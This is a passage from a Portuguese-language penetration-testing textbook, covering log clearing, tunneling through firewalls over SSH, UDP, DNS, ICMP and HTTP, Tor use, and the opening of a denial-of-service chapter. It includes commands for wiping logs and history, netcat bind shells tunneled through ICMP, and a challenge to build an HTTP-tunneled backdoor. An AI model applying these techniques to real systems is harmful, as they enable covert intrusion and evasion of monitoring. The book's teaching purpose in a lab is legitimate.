tsegurança.\n•\t\nSysEvent.Evt\n\t–\teventos\tdo\tsistema.\nPara\tlimpar\tos\tlogs\t(como\tusuário\t\nnt\tauthority\\system\n):\nmeterpreter\n\t>\tclearev\nNo\tLinux\té\tinteressante\tdesabilitar\to\thistórico\tde\tcomandos\tcom:\nunset\tHISTFILE\nDessa\tforma,\ttudo\to\tque\tfor\tdigitado\tnão\tserá\tarmazenado\tno\thistórico\tde\ncomandos\tpara\taquela\tsessão\tdo\tbash.\nAlém\tdisso,\té\tinteressante\tremover\tas\tlinhas\tdos\tlogs\tde\tautenticação\tdo\tsistema\nque\ttenham\tseu\tIP.\nOs\tlogs\tdo\tLinux\tencontram-se\tem\t\n/var/log\n,\tmas\tcertifique-se\tde\tque\tos\tlogs\tsão\nguardados\tnesse\tdiretório\tacessando\to\tarquivo\t\n/etc/syslog.conf\n\t(para\to\tsyslog)\tou\n/etc/rsyslog.conf\n\t(para\tsistemas\tque\tutilizam\to\trsyslog).\tLembrando\tmais\tuma\nvez\tque\ta\tremoção\tde\tlogs\tserá\tpouco\tútil\tem\tsistemas\tcom\tIDS\tou\tque\narmazenam\tlogs\tremotamente.\n•\t\n/var/log/auth.log\n\t–\tLogs\tde\tautenticação\tdo\tsistema.•\t\n/var/log/lastlog\n\t–\tLog\tdo\tcomando\t\nlastlog\n.\n•\t\n/var/log/wtmp\n\t–\tLog\tdo\tcomando\t\nlast\n.\n•\t\n/var/log/btmp\n\t–\tLog\tdo\tcomando\t\nlastb\n.\n•\t\n/var/run/utmp\n\t–\tLog\tdos\tcomandos\t\nw\n/\nwho\n.\nHá\tscripts\te\tferramentas\tque\tauxiliam\tna\tlimpeza\tdo\tlog.\tUm\tbom\trepositório\nencontra-se\tem\t\nhttp://packetstormsecurity.com/UNIX/penetration/log-wipers/\n.CAPÍTULO\n\t14\nTunneling\nTunneling\tou\ttunelamento\té\tuma\ttécnica\tem\tque\tse\tcria\tum\ttúnel\tvirtual\tentre\ndois\thosts\tremotos,\tpermitindo\tque\testes\tpossam\tse\tcomunicar\tperfeitamente,\tde\nforma\tsegura,\tpois\tos\tdados\tque\tcirculam\tna\trede\tsão\tcriptografados.\tO\ntunneling\ttambém\tpode\tser\tusado\tpara\tcriar\tconexões\tmaliciosas\tprotegidas\ncontra\tfirewall.\nVamos\tprimeiro\timaginar\ta\tseguinte\tsituação:\tEm\tuma\trede\tcorporativa\tem\tque\na\tmáquina\tA\t(que\testá\tprotegida\tpor\tfirewall)\tdeseja\tcomunicar-se\tcom\ta\nmáquina\tB\tque\testá\tfora\tda\trede,\to\tprocesso\tfeito\té\teste:\n•\tNa\tconexão\tde\tida:\nA\t—>\tFirewall/Proxy\t—>\tInternet\t—>\tB\n•\tNa\tconexão\tde\tvolta:\nB\t—>\tInternet\t—>\tFirewall/Proxy\t—>\tA\nIsso\tseria\tmuito\tbom\tem\tuma\tconexão\tnormal,\tsem\tregras\trestritivas\tde\tfirewall\nou\tproxy.\tAgora…\timaginem\ta\tseguinte\tsituação:\n•\tNa\tconexão\tde\tida:\nA\t—>\tFirewall/Proxy\t--xx--\tInternet\t—\tB\nO\tfirewall\tnão\testá\tdeixando\ta\tmáquina\tA\tacessar\ta\tmáquina\tB;\to\tpedido\tpara\no\tfirewall\te\tnem\tsequer\tvai\tpara\ta\tinternet.\nNo\texemplo\tanterior,\ta\tmáquina\tA\testá\tprotegida\tpor\tum\tfirewall\te\tnão\nconsegue\tcomunicar-se\tcom\ta\tmáquina\tB.\nEm\tuma\tconexão\tvia\ttunneling:\n•\tNa\tconexão\tde\tida:\nA\t—>\tFirewall/Proxy\t—>\tInternet\t—>\tB\nA\t=====Túnel\tatravés\tda\tinternet=====\tB\nA\tmáquina\tA\tconecta-se\tcom\ta\tmáquina\tB\tpor\tmeio\tde\tum\ttúnel\tcriado.\n•\tNa\tconexão\tde\tvolta:B\t—>\tInternet\t—>\tFirewall/Proxy\t—>\tA\nB\t=====Túnel\tatravés\tda\tinternet=====\tA\nA\tmáquina\tB\tconecta-se\tcom\ta\tmáquina\tA\tpor\tmeio\tdo\ttúnel\tcriado.\nEsse\ttúnel\tapenas\trepassa\ta\tinformação\tentre\tas\tduas\textremidades\t(máquina\tA\te\nmáquina\tB).\tÉ\tcomo\tse\to\tfirewall\tnão\texistisse.\tMas\to\tfirewall\texiste,\tapenas\nestamos\tburlando\tsuas\tregras.\nO\ttúnel\tvirtual\tnada\tmais\té\tdo\tque\tutilizar\tum\tponto\tC\tpara\trealizar\ta\nretransmissão\tdos\tdados,\tconforme\tmostra\ta\tfigura\t14.1.\nFigura\t14.1\t–\tO\ttunneling\tnada\tmais\té\tdo\tque\tutilizar\tuma\tmáquina\tC\t(que\tnão\nesteja\tprotegida\tcom\to\tfirewall)\tcomo\tpivô\tpara\tacessar\toutros\thosts\t(como\ta\nmáquina\tB).\nO\ttunneling\té\tusado\tnas\tseguintes\tsituações:\n•\tNecessidade\tde\tproteção\tdos\tdados\t(o\ttunneling\tprotege\tcontra\tataques\tde\nMitM).\n•\tAcessar\tdestinos,\tserviços\te\tprotocolos\tbloqueados.\n•\tAcessar\tuma\tmáquina\tda\trede\tinterna.\n•\tNecessidade\tde\tencapsular\tuma\tconexão\tde\tbackdoor\tpor\tmeio\tde\tprotocolos\npouco\tfiltrados\tpor\tfirewall\t(como\tencapsular\tuma\tconexão\tTCP\tdentro\tdo\nprotocolo\tHTTP).\n14.1\tLaboratório\tTunneling\nConforme\tmostra\ta\tfigura\t14.1,\tpara\tas\tnossas\tatividades:\n•\tPonto\tA:\tKali\tLinux\n•\tFirewall:\tDebian\n•\tPonto\tB:\tDebian•\tPonto\tC:\tWindows\nTambém\té\tnecessário\to\tservidor\tSSH\tinstalado\ttanto\tno\tponto\tA\t(Kali\tLinux)\ncomo\tno\tponto\tC\t(Windows\t–\to\tservidor\tque\tserá\tusado\tcomo\tde\tponte\tpara\ta\nconexão\tcom\to\tPonto\tB).\nBons\tsoftwares\tSSH\tpara\tWindows\tsão:\n•\tMobaSSH\t–\t\nhttp://mobassh.mobatek.net\n•\tOpenSSH\t–\t\nhttp://sshwindows.sourceforge.net\nConfigure\to\tiptables\tdo\tDebian\tpara\taceitar\tconexões\toriundas\tdo\tponto\tC:\nroot@debian#\n\tiptables\t-A\tINPUT\t-p\ttcp\t--dport\t80\t-j\tDROP\t!\t-s\t192.168.1.101\nO\tDebian\taceita\tconexões\tapenas\toriundas\tdo\tWindows,\tsendo\tbloqueado\tpara\to\nKali\tLinux.\tA\tmáquina\tcom\to\tKali\tLinux\tvai\tconectar-se\tao\tWindows\tvia\tSSH,\ne\tas\tconexões\taté\ta\tmáquina\tDebian\tterão\torigem\tcomo\tsendo\to\tWindows,\nrealizando\to\ttunneling.\n14.2\tSSH\tTunneling\nNo\tSSH\ttunneling,\to\ttúnel\té\tcriado\tusando-se\tpor\tbase\to\tprotocolo\tTCP\tcom\ta\nsua\tconexão\tcriptografada\t(usando-se\to\tSSH),\tou\tseja,\tos\tdados\tserão\ntransmitidos\tencapsulados\tpor\tmeio\tdo\tprotocolo\tSSH.\nAcesse\to\tservidor\tSSH\tWindows\tno\tKali\tLinux:\nroot@kali#\t\nssh\t-l\troot\t192.168.1.101\t-D\t8000\nDigite\ta\tsenha\tdo\tusuário\tWindows,\te,\tapós\tentrar\tno\tseu\tservidor\tSSH,\ta\nmáquina\tKali\tLinux\tcriará\tum\tSOCKS4\t(que\tfica\tna\tescuta\tna\tporta\t8000).\nPara\tusar\to\ttúnel,\tabra\to\tnavegador\te,\tem\tconfigurações\tda\tconexão\tde\trede,\nescolha\ta\topção\tSOCKS4\tcom\tos\tendereços\t127.0.0.1\t8000.\nA\tconfiguração\tdo\tsocks\tpode\tser\tobservada\tna\tfigura\t14.2.Figura\t14.2\t–\tConfiguração\tdo\tsocks\tlocal\tpara\tacessar\to\ttúnel.\n14.3\tUDP\ttunneling\nNo\tUDP\ttunneling,\to\ttúnel\té\tcriado\tusando-se\tpor\tbase\to\tprotocolo\tUDP,\tou\nseja,\tos\tdados\tserão\ttransmitidos\tencapsulados\tpor\tmeio\tdo\tprotocolo\tUDP.\nO\t udptunnel\t pode\t ser\t encontrado\nem:\nhttp://code.google.com/p/udptunnel/downloads/list\n.\nNa\tmáquina\tWindows,\tdigite\tno\tprompt\tde\tcomando:\nC:\\\t\nudptunnel.exe\t-v\t-s\t4444\nO\tupdtunnel\tficará\tesperando\tpor\tconexões\tna\tporta\tUDP\t4444\tdo\ttúnel.\nNo\tKali\tLinux,\tcompile\to\tudptunnel\tdigitando\t\nmake\n\tno\tterminal:\nroot@kali:~udptunnel#\n\tmake\nroot@kali:~/udptunnel#\n\t./udptunnel\t-c\t127.0.0.1\t44\t192.168.1.101\t4444\t127.0.0.1\t22\nNo\tcomando\tcliente,\tvocê\testá\tdizendo\tao\tudptunnel\tque\tatue\tcomo\tcliente\t\n(-c\n).\nFique\tlistando\tno\tIP\t127.0.0.1\tna\tporta\t44\te\tconecte-se\tao\tendereço\tIP\n192.168.1.101\tna\tporta\t4444.\tFeito\tisso,\to\ttúnel\té\tcriado,\te,\tquando\tfor\tacessado,\nvocê\tserá\tredirecionado\tao\tIP\t127.0.0.1\t(192.168.1.101)\tna\tporta\t22.\nOu\tseja,\teu\tconecto-me\tao\tIP\t127.0.0.1\tna\tporta\t44,\to\tudptunnel\tfecha\to\ttúnel\ncom\to\tWindows\t192.168.1.101\tna\tporta\t4444,\te\teu\tacesso\to\tendereço\t127.0.0.1\nna\tporta\t22\tcomo\tse\ta\tminha\tmáquina\tLinux\tfosse\ta\tmáquina\tWindows.\nDigite\tem\toutro\tterminal:root@kali#\n\tssh\t-l\troot\t-p\t44\t127.0.0.1\t-D\t8000\nEntre\tcom\tsua\tsenha\tdo\tservidor\tSSH\tWindows\te\tconfigure\to\tseu\tnavegador\npara\tacessar\tvia\tsocks.\nA\tconfiguração\tdo\tsocks\tpode\tser\tobservada\tna\tfigura\t14.2.\n14.4\tDNS\ttunneling\nPara\tse\tcriar\ttúneis\tvia\tDNS,\tserá\tnecessário\tter\tacesso\tà\tporta\t53.\tPara\tisso,\ta\nmelhor\tmedida\ta\tser\tadotada\té\tcontratando-se\tum\tVPS\n1\n.\tApenas\tpor\tmotivos\ndidáticos\tserá\tconfigurado\to\ttúnel\tDNS\tpara\ta\trede\tlocal.\nComo\to\tconceito\tde\ttunneling\tjá\tfoi\tdescrito\tnas\tseções\t14.2,\t“SSH\tTunneling”,\ne\t14.3,\t“UDP\tTunneling”,\tas\tregras\tde\tbloqueio\tdo\tiptables\tnão\tsão\tmais\nnecessárias.\nroot@debian#\n\tiptables\t-F\nPrimeiro,\tdesabilite\to\tbind9\tno\tDebian:\nroot@debian#\n\tservice\tbind9\tstop\nInstale\to\tdns2tcp\tno\tDebian\tcom\to\tcomando:\nroot@debian#\n\tapt-get\tinstall\tdns2tcp\nAltere\to\tarquivo\t\n/etc/dns2tcpd.conf\n,\tpara\to\tseguinte\tconteúdo:\nlisten\t=\t0.0.0.0\nport\t=\t53\n#If\tyou\tchange\tthis\tvalue,\talso\tchange\tthe\tUSER\tvariable\tin\t/etc/default/dns2tcpd\nuser\t=\tnobody\nchroot\t=\t/tmp\ndomain\t=\tdnstunnel\nresources\t=\tssh:127.0.0.1:22\nOs\tparâmetros\tde\tconfiguração\tdo\tDNS\tTunnel\tsão:\n•\t\nlisten\n\t–\tPor\tqual\tendereço\tIP\to\tDNS\tTúnel\tfica\tesperando\tpor\tconexões.\n0.0.0.0\tindica\ttodos\tos\tendereços\tda\tmáquina\tlocal.\n•\t\nport\n\t–\tPorta\tDNS\t(53).\n•\t\ndomain\n\t–\tDomínio\tque\to\tdns2tcp\tvai\tcriar\t(por\tisso\to\tbind9\tfoi\tfinalizado).\n•\t\nresources\n\t–\tRecursos\tdisponíveis\tno\ttúnel\tDNS.\tPrimeiro\té\to\tnome\tdo\nrecurso\tdisponível\t(chamado\tde\tSSH);\tdepois,\tpara\tqual\tIP\tserá\tfinalizado\totúnel\t(IP\tlocal)\te\tpara\tqual\tporta\t(porta\t22).\nInicie\to\tserviço\tcom:\nroot@debian#\n\tdns2tcpd\t-f\t/etc/dns2tcpd.conf\nNo\tKali\tLinux,\tteste\ta\tconectividade\tdo\tservidor\tde\ttúnel\tpor\tmeio\tdo\tcomando:\nroot@kali#\n\tdns2tcpc\t-z\tdnstunnel\t192.168.1.102\nAvaible\tconnection(s):\nssh\nNote:\tCompression\tSEEMS\tavaible!\nO\tservidor\tDNS\trespondeu\tque\thá\tconexões\tdisponíveis.\nUtilize\to\tservidor\tde\ttúnel\tcom\to\tcomando:\nroot@kali#\n\tdns2tcpc\t–z\tdnstunnel\t–l\t4444\t–r\tssh\t192.168.1.102\nListening\ton\tport\t:\t4444\nO\tcliente\tdo\tDNS\ttúnel\tfica\tesperando\tpor\tconexões\tlocalmente\tna\tporta\t4444.\nNo\tmomento\tem\tque\tfor\testabelecida\tuma\tconexão,\to\tDNS\ttúnel\tvai\tse\tconectar\nvia\tSSH\tno\tIP\t192.168.1.102.\nConecte-se\tvia\tSSH\te\tutilize\to\ttúnel\t(digite\ta\tsenha\tdo\tDebian):\nroot@kali#\n\tssh\t–p\t4444\tlocalhost\t–D\t8000\nConfigure\to\tseu\tnavegador\tpara\tacessar\tvia\tsocks.\tA\tconfiguração\tdo\tsocks\tpode\nser\tobservada\tna\tfigura\t14.2.\n14.5\tICMP\tTunneling\nIdem\tàs\ttécnicas\tanteriores,\tporém\to\tICMP\ttunneling\tencapsula\to\tprotocolo\tTCP\ndentro\tdo\tprotocolo\tICMP.\nInstale\to\tICMP\ttunnel\tno\tDebian:\nroot@debian#\n\tapt-get\tinstall\tptunnel\nAs\tregras\tde\tbloqueio\tdo\tiptables\tnão\tsão\tnecessárias\t(devido\taos\tlaboratórios\nanteriores\tde\ttunneling,\to\tconceito\tjá\tfoi\texplicado):\nroot@debian#\n\tiptables\t-F\nInicialize\to\tptunnel\tno\tDebian:\nroot@debian#\n\tptunnel\nNo\tKali\tLinux,\tconecte-se\tao\tservidor\tDebian\tcom\to\tcomando:root@kali#\n\tptunnel\t–p\t192.168.1.102\t–lp\t4444\t–da\t192.168.1.102\t–dp\t22\nNesse\tmomento\to\tptunnel\tficará\tesperando\tpor\tconexões\tlocalmente\tna\tporta\n4444.\tQuando\thouver\tuma\tconexão\tnessa\tporta,\to\tptunel\tvai\tenviar\tpacotes\nICMP\tpara\to\tservidor\tdo\tDebian\te\tredirecionará\ta\tconexão\tdo\tKali\tLinux\tpara\to\nIP\t192.168.1.102\tna\tporta\t22.\nConecte-se\tvia\tSSH\te\tcrie\tum\tsocks:\nroot@kali#\t\nssh\tlocalhost\t–p\t4444\t–D\t8000\nConfigure\to\tseu\tnavegador\tpara\tacessar\tvia\tsocks.\tA\tconfiguração\tdo\tsocks\tpode\nser\tobservada\tna\tfigura\t14.2.\n14.6\tCanais\tencobertos\tvia\ttunneling\nAlém\tde\tconexões\tlegítimas,\tum\tatacante\tpode\tcriptografar\ta\tsua\tconexão\tpara\npassar\tpor\tfirewalls.\nPara\tcriarmos\tuma\tconexão\tcom\to\tnetcat\tque\tseja\ttunelada\tvia\tICMP\t(pode\tser\nqualquer\ttipo\tde\ttunelamento,\to\tprincípio\té\to\tmesmo),\tprimeiro\tvamos\telaborar\numa\tregra\trestritiva\tno\tDebian\tpara\tsomente\taceitar\tpacotes\tICMP\te\tconexões\noriundas\tapenas\tda\tmáquina\tlocal.\nroot@debian#\t\niptables\t-A\tINPUT\t-p\ttcp\t-j\tDROP\t!\t-s\t127.0.0.1\nInicie\to\tnetcat\tlistando\tna\tporta\t666:\nroot@debian#\t\nnc\t-l\t-p\t666\t-e\t/bin/bash\t-vv\nNo\tKali\tLinux,\ttente\tacessar\ta\tporta\t666\tdo\tservidor\tDebian:\nroot@kali#\t\nnc\t192.168.1.102\t666\t-vv\nSem\tconexão,\tcerto?\tAgora\trealize\to\tprocedimento\tde\ttunelamento.\nNa\tmáquina\tDebian:\nroot@debian#\t\nptunnel\nNo\tKali\tLinux:\nroot@kali#\t\nptunnel\t–p\t192.168.1.102\t–lp\t4444\t–da\t127.0.0.1\t–dp\t666\nAs\tseguintes\topções\tdo\tptunnel\tforam\tutilizadas:\n-p\nIP\tdo\talvo.\n-lp\nPorta\tlocal\tque\tfica\tna\tescuta.-da\nIP\tpara\to\tqual\ta\tmáquina\tserá\tredirecionada\tquando\tconectar-se\tà\tporta\t4444.\n-dp\nPorta\tTCP\tdestino\t(no\texemplo,\ta\tporta\tde\tescuta\tdo\tnetcat).\nConecte-se\tlocalmente\tà\tporta\t4444:\nroot@kali#\t\nnc\tlocalhost\t4444\t-vv\nE\tagora,\tconseguimos\to\tnosso\tshell?\nDigite\tum\tcomando\tde\tterminal\tqualquer\tdentro\tdo\tnetcat,\tpor\texemplo:\nmkdir\tDaniel_Moreno\nSe\tfor\trealizado\tum\tmonitoramento\tdo\ttráfego\tcom\tum\tsniffer\t(como\to\nWireshark,\ttcpdump\tetc.),\té\tpossível\tver\tque\to\tcomando\t\nmkdir\tDaniel_Moreno\nfoi\tencapsulado\tdentro\tdo\tprotocolo\tICMP.\tA\tfigura\t14.3\tmostra\tuma\tconexão\nde\tbackdoor\tdentro\tde\tum\tpacote\tICMP.\nFigura\t14.3\t–\tConexão\tTCP\tencapsulada\tem\tum\tpacote\tICMP.\nO\tWindows\tpossui\ta\tversão\tcompilada\tque\tpode\tser\tencontrada\tem\nhttp://neophob.com/2007/10/pingtunnel-for-windows-icmp-tunnel/\n.\tÉ\tnecessária\na\tinstalação\tdo\tWinPCAP\t(\nhttp://www.winpcap.org/)\t\npara\to\tprograma\tfuncionar\ncorretamente.\tO\tseu\tfuncionamento\té\tidêntico\tao\tLinux,\tcom\ta\tdiferença\tde\tque\nnós\tdevemos\tespecificar\ta\tinterface\tde\trede\tlocal.\nPor\texemplo,\tna\tmáquina\tWindows\tvamos\tlistar\tuma\tconexão\tcom\to\tnetcat:\nC:\\\t\nnc.exe\t-l\t-p\t666\t-e\tcmd.exe\t-vv\nAcesse\to\t\ncmd.exe\n\tcomo\tadministrador\te\tveja\tquais\tsão\tas\tinterfaces\tlocais\ndisponíveis\t(abreviado\tpor\tmotivos\tvisuais):\nC:\\ptun-rel1>\t\nptunnel.exe\t-h\nWindows\tpcap\tdevices:\n\\Device\\NPF_{B8604B37-2B10-4CA8-94B4-853966820B3D}\n\t\tDescription:\tIntel(R)\tPRO/1000\tMT\tDesktop\tAdapter\n\t\tLoopback:\tno\n\t\tAddress\tFamily:\t#23\t\tAddress\tFamily\tName:\tUnknown\t(IP6\tis\tNOT\tsupported!)\n\t\tAddress\tFamily:\t#2\n\t\tAddress\tFamily\tName:\tAF_INET\nInicialize\to\tptunnel\tcom\ta\tinterface\tlocal:\nC:\\ptun-rel1>\t\nptunnel.exe\t-c\t\"\\Device\\NPF_{B8604B37-2B10-4CA8-94B4-853966820B3D}\"\nNo\tKali\tLinux\tliste\te\tconecte-se\tvia\tICMP\tTunnel:\nroot@kali#\t\nptunnel\t–p\t192.168.1.101\t–lp\t4444\t–da\t127.0.0.1\t–dp\t666\nroot@kali#\t\nnc\tlocalhost\t4444\t-vv\nO\texemplo\tcom\to\tptunnel\tfoi\tapenas\tmetodológico,\tmas\tsaiba\tque\texistem\nbackdoors\te\tsoftwares\tmaliciosos\tque\tfazem\ta\ttransmissão\tde\tseus\tdados\tpor\ntunelamento\tde\tICMP,\tnão\tabrindo\tnenhuma\tporta\tno\tsistema\talvo.\tUm\nexcelente\tsoftware\tque\tvale\ta\tpena\tser\tcitado\té\to\tICMPSH\n(\nhttp://www.leidecker.info/downloads/index.shtml#shells\n),\tque\trealiza\tum\ntunelamento\treverso\tpor\tmeio\tde\trequisições\tICMP\tEcho\tRequest\te\tEcho\tReply,\nabrindo\to\tshell\t\ncmd.exe\n\tna\tmáquina\tdo\tatacante.\tO\tseu\tcódigo-fonte\té\tsimples\te\njá\tpossui\tum\tbinário\tcompilado\tpara\to\tWindows,\tmas\tnada\timpede\to\tleitor\tde\nalterar\to\tseu\tcódigo\tpara\tatender\tàs\tsuas\tnecessidades.\tEncorajo\to\tleitor\ta\tler\nsobre\tessa\tferramenta\te\ttestá-la.\n14.7\tHTTP\tTunnel\nPara\tesse\tlaboratório\tserá\tutilizado\to\tGNU\tHTTP\tTunnel,\tobtido\tem\nhttp://\nneophob\n.com/2006/10/gnu-httptunnel-v33-windows-binaries/\n.\nO\tGNU\tHTTP\tTunnel\tpossibilita\to\tHTTP\tTunnel\tem\tplataformas\tWindows.\n•\tLado\tservidor:\nC:\\\n\thts.exe\t–F\tlocalhost:22\t23\nO\thts\tficará\tescutando\tna\tporta\t23\te\tfará\tum\tredirecionamento\tpara\tlocal\thost\nna\tporta\t22.\n•\tLado\tcliente:\nroot@kali#\t\napt-get\tinstall\thttptunnel\nroot@kali#\n\thtc\t-F\t999\t192.168.1.101:23\nO\thtc\tficará\tescutando\tpor\tconexões\tna\tporta\t999\te\trealizará\to\ttúnel\tno\nservidor\t(192.168.1.101)\tna\tporta\t23.Conecte-se\tvia\tSSH\te\tcrie\tum\tsocks:\nroot@kali#\t\nssh\tlocalhost\t-p\t999\t-D\t8000\nConfigure\to\tseu\tnavegador\tpara\tacessar\tvia\tsocks.\tA\tconfiguração\tdo\tsocks\tpode\nser\tobservada\tna\tfigura\t14.2.\n\t\nNota:\n\tDesafio\to\tleitor\ta\tcriar\tuma\tbackdoor\tcom\to\ttráfego\ttunelado\tsob\to\tprotocolo\tHTTP.\n\t\n14.8\tRedes\tTOR\nA\tredeTOR,\ttambém\tchamada\tde\tredeOnion\t(rede\tcebola),\té\tuma\trede\tque\tfoi\ncriada\tcom\to\tintuito\tde\tproteger\ta\tanonimidade\tdos\tusuários\tque\tnavegam\tsobre\nela.\tPara\tgarantir\ta\tsegurança\tdos\tdados,\ta\trede\tutiliza\to\tprotocolo\tTLS\tpara\ntransporte.\tEntão,\tpor\texemplo,\tse\to\tleitor\tconectar-se\tà\trede\tTOR\te\tacessar\tum\nsite\tHTTP,\tterá\tos\tdados\tHTTP\tcriptografados\tcom\to\tprotocolo\tTLS,\ttornando\ninviáveis\tataques\tde\tcaptura\tremota\tde\tdados.\nA\trede\tfunciona\tpor\tmeio\tde\tpontos\tou\tnó.\tPor\texemplo:\tAo\tconectar-se\tà\trede\nTOR,\to\tusuário\tterá\tos\tseus\tdados\tpassando\tpor\tum\tnó\t(uma\tsaída),\te\té\tesse\tnó\té\nque\tvai\tgarantir\ta\tanonimidade.\tDe\tforma\tbem\tparecida\tcom\to\tfuncionamento\ndo\tprograma\tproxychains,\to\tnó\tpode\tse\tconectar\ta\toutro\tnó\te\tassim\nsucessivamente,\tformando\tum\ttunelamento\tde\tdados\tentre\tcada\textremidade.\nPor\texemplo:\to\tusuário\tconecta-se\tà\trede\tTOR;\ta\trede\tTOR\tescolhe\naleatoriamente\tum\tnó\t(por\texemplo\to\tnó\tABC)\te\tconecta-se\ta\tele.\tEsse\tnó\tvai\nconectar-se\tao\tnó\tDEF\te\tassim\tsucessivamente.\tO\túltimo\tnó\tenviará\ta\tconexão\ndo\tusuário\tao\tdestino\trequerido.\nEmbora\tgaranta\ta\tanonimidade\tescolhendo\tnós\taleatórios\tna\trede\t(o\tque\ndificulta\to\trastreamento\tda\torigem\tdos\tdados),\tas\tredes\tTOR\tnão\tgarantem\tem\nnada\tquanto\tà\tprivacidade\tdos\tdados.\tIsso\tporque\to\túltimo\tnó\tterá\tacesso\tàs\nrequisições\toriginalmente\tfeitas\tpelo\tusuário.\tEntão,\tpor\texemplo,\tse\to\tusuário\nconectar-se\tà\trede\tTOR\tfazendo\tum\tlogin\tem\tum\tsite\tHTTP,\tos\tdados\testarão\ncriptografados\tcom\tTLS\taté\tchegar\tao\tnó\tfinal.\tChegando\tao\tnó\tfinal,\tos\tdados\npoderão\tser\tinterceptados\te\tlidos\tpor\tesse\tnó\tantes\tde\tefetivamente\tserem\nentregues\tao\tsite\tHTTP.\tConforme\ta\texcelente\tcitação\n2\n:\nse\to\tusuário\tconfigurar\to\tseu\tTor\tpara\toperar\tcomo\tservidor\tde\trelay,\tterá\ta\npossibilidade\tde\tlogar\to\ttráfego\toriginal\tde\ttodas\tas\tpessoas\tque\testiverempassando\tpor\ttúneis\tcujo\tnó\tde\tsaída\tseja\to\tseu\tnó\tTor.\nEm\toutras\tpalavras,\tos\tdados\ttrafegam\tde\tforma\tcriptografada\te\tsegura\taté\to\núltimo\tnó.\tO\túltimo\tnó\ttem\ttotal\tacesso\te\tleitura\tsobre\tos\tdados.\tEntão,\tleitor,\ntome\tcuidado\tao\tutilizar\tredes\tTOR.\tParticularmente,\tprefiro\tutilizar\tmétodos\ntradicionais\tde\tcriptografia\te\ttunelamento\t(como\to\ttunelamento\tSSH\tou\tmesmo\nVPN)\tpara\tgarantir\ta\tprivacidade\tdos\tmeus\tdados,\tisso\tporque\teu\tsei\tquem\té\ta\nextremidade\tda\tminha\tconexão\te\ttenho\tconfiança\tnela\t(algo\tbem\tdiferente\tdas\nredes\tTOR,\tem\tque\ta\textremidade\tfinal\t–\tou\to\tnó\tfinal\t–\té\tum\ttotal\ndesconhecido\tda\tinternet).\tAlém\tde\tque\tredes\tTOR\tàs\tvezes\tsão\tmuito\tlentas.\nNas\tpróximas\tlinhas,\tensinarei\to\tleitor\ta\tconfigurar\tum\tcliente\tpara\tacessar\ta\nrede\tTOR,\ta\tescolha\tde\tacessá-la\tou\tnão\tpara\t“proteger”\tos\tseus\tdados\tserá\tde\nplena\tresponsabilidade\tsua.\nInstale\to\tTOR\tno\tKali\tLinux:\nroot@kali#\n\tapt-get\tinstall\ttor\nAo\tiniciar\ta\trede\tTOR\té\tcriado\tum\tsocks\tlocal\tque\tfará\ta\tponte\tcom\tos\tnós\tdo\nTOR\nroot@kali#\n\tservice\ttor\tstart\nConfigure\to\tproxychains\tpara\tacessar\ta\tporta\tlocal\t9050.\tO\tarquivo\tde\nconfiguração\t\n/etc/proychains.conf\n\tficará\tda\tseguinte\tforma:\ndynamic_chain\nproxy_dns\ntcp_read_time_out\t15000\ntcp_connect_time_out\t8000\n[ProxyList]\nsocks4\t127.0.0.1\t9050\nAcessse\tqualquer\tprograma\tque\tqueira.\tPor\texemplo,\tfaça\tum\tteste\tcom\to\niceweasel\nroot@kali#\t\nproxychains\ticeweasel\nAcesse\to\tendereço\t\nhttp://www.meuip.com.br\n.\tO\tseu\tIP\tserá\tde\talgum\tnó\naleatório\tda\trede\tTOR.\n1\n\t\nVirtual\tPrivate\tServer\n,\tServidor\tPrivado\tVirtual,\té\tum\tservidor\tacessível\tpela\tinternet.\tAo\tcontratar\tuma\nVPS,\to\tusuário\tpossui\tacesso\troot\ta\tesse\tservidor.\tA\tvantagem\té\tque\tesses\tservidores\tpossuem\ndeterminadas\tportas\tliberadas\tpara\tacesso\tao\tpúblico,\tcomo\ta\t53.\n2\n\tFonte:\t\nhttp://pt.wikipedia.org/wiki/Tor_(rede_de_anonimato)\n.CAPÍTULO\n\t15\nDoS\t–\tDenial\tof\tService\nO\tpentest\té\tfinalizado\tcom\to\tprocesso\tde\ttunneling\te\tcom\ta\tescrita\tdo\trelatório\nfinal,\trelacionando\tàs\tvulnerabilidades.\tPorém,\tem\tcasos\textremos,\ttambém\té\nnecessário\ttestar\ta\tcapacidade\tque\ta\trede\ttem\tcontra\tum\tataque\tde\tnegação\tde\nserviço.\nOs\tataques\tde\tnegação\tde\tserviço\t(DoS\t–\tDenial\tof\tService)\tou\ttambém\nchamados\tde\t“teste\tde\tstress”\tsão\tuma\tclasse\tespecífica\tde\tataques,\tnão\tsendo\nobtido\to\tacesso\tao\tsistema\tou\tao\tshell.\nBasicamente,\ta\tideia\té\tsobrecarregar\to\tservidor\tcom\tum\texcesso\tde\tpacotes,\nfazendo\tcom\tque\ta\tsua\tbanda\tfique\tlenta,\tsobrecarregada\te\taté\tmesmo\tcaia.\nHá\tdiversas\tclasses\tde\tataques\te\ttipos\tde\tnegação\tde\tserviços.\tOs\tataques\tde\nDoS\tpodem\tser\tcategorizados\tde\tacordo\ta\tcamada\tdo\tmodelo\tOSI\tque\tafetam:\n•\t\nLayer\t7\n\t–\tAtaques\tDoS\tdestinados\tà\tLayer\t7\tsão\tataques\tque\tnão\trequerem\nbanda\tpara\ta\tsua\tutilização.\tÉ\ta\tclasse\tque\texplora\tvulnerabilidades\tem\nsoftwares\tpara\tcausar\to\tDoS.\nExemplos:\tslowloris\te\ta\tvulnerabilidade\tms12_020_maxchannelids.\n•\t\nLayer\t4\n\t–\tAtaques\tDoS\tdestinados\tà\tLayer\t4\tsão\tataques\tque\trequerem\tmuita\nbanda\tpara\tserem\tutilizados.\tNessa\tclasse\tde\tataques\testão\tos\tsoftwares\tque\nfazem\tinundação\tde\tpacotes,\tcomo\to\tSYN\tFlood.\tNão\thá\tmuito\to\tque\tfazer\nquando\tuma\tinstituição\tsofre\tum\tataque\tdessa\tcategoria,\tpois,\tconforme\ta\nbanda\tdo\tatacante,\ta\tsua\tvítima\tfica\tsobrecarregada.\nExemplos:\tSYN\tFlood,\tUDP\tFlood.\n•\t\nLayer\t2\n\t–\tAtaques\tDoS\tdestinados\tà\tLayer\t2\tsão\tataques\tvoltados\tao\nprotocolo\tMAC\tde\tcomunicação.\nExemplos:\tAtaques\tDe-Auth\tem\tredes\tsem\tfio\te\to\tMAC\tFlooding.\n15.1\tSYN\tFlood\nO\tataque\tde\tSYN\tFlood\texplora\to\t\n3-way\thandshake\n\tpara\tobter\tsucesso.\tÉcaracterizado\tpor\tenviar\tum\texcesso\tde\tpacotes\tSYN\tcom\tendereços\tIP\tfalsos\npara\ta\tmáquina\tvítima\t(e